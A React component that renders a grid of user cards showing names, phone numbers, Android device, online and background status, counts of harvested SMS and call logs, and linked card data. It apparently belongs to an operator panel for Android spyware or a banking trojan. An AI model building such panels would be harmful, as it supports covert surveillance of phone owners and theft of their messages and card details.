import React from 'react';
import { Smartphone, Clock, CreditCard, MessageSquare, Phone, ChevronRight } from 'lucide-react';

export default function UserGrid({ users, onSelectUser }) {
  if (users.length === 0) {
    return (
      <div className="glass-panel" style={{ padding: '3rem', textAlign: 'center', color: '#9ca3af' }}>
        <p style={{ fontSize: '1.1rem', marginBottom: '0.5rem' }}>No user records match your search.</p>
        <p style={{ fontSize: '0.85rem' }}>Try refining your name, phone number, or ID query.</p>
      </div>
    );
  }

  return (
    <div className="user-cards-grid">
      {users.map((user) => {
        const isUserActive = user.isActive || user.isOnline;
        const initials = user.fullName
          ? user.fullName.split(' ').map(n => n[0]).join('').substring(0, 2).toUpperCase()
          : 'US';

        return (
          <div
            key={user.id}
            className={`glass-panel user-card ${isUserActive ? 'active' : 'inactive'}`}
            onClick={() => onSelectUser(user)}
          >
            <div className="user-card-header">
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                <div className="user-avatar">{initials}</div>
                <div className="user-title">
                  <h4>{user.fullName}</h4>
                  <p>{user.mobileNumber}</p>
                </div>
              </div>
              <div className={`pulse-badge ${isUserActive ? 'active' : 'inactive'}`}>
                <span className="pulse-dot"></span>
                <span>{isUserActive ? 'Active' : 'Offline'}</span>
              </div>
            </div>

            <div className="user-meta-list">
              <div className="user-meta-item">
                <Smartphone size={14} />
                <span>{user.stringField || 'Android Device'}</span>
              </div>
              <div className="user-meta-item">
                <Clock size={14} />
                <span>Last active: {user.lastActivityTime || 'Recently'}</span>
              </div>
              {user.appInBackground && (
                <div className="user-meta-item" style={{ color: '#f59e0b' }}>
                  <span style={{ fontSize: '0.75rem', fontWeight: 600 }}>• Running in Background</span>
                </div>
              )}
            </div>

            <div className="user-card-footer">
              <span style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                <span style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>
                  <MessageSquare size={13} /> {user.smsLogs?.length || 0}
                </span>
                <span style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>
                  <Phone size={13} /> {user.callLogs?.length || 0}
                </span>
                {user.cardData && (
                  <span style={{ display: 'flex', alignItems: 'center', gap: '4px', color: '#8b5cf6' }}>
                    <CreditCard size={13} /> Card Linked
                  </span>
                )}
              </span>

              <span style={{ display: 'flex', alignItems: 'center', color: '#6366f1', fontWeight: 600 }}>
                View Details <ChevronRight size={14} />
              </span>
            </div>
          </div>
        );
      })}
    </div>
  );
}
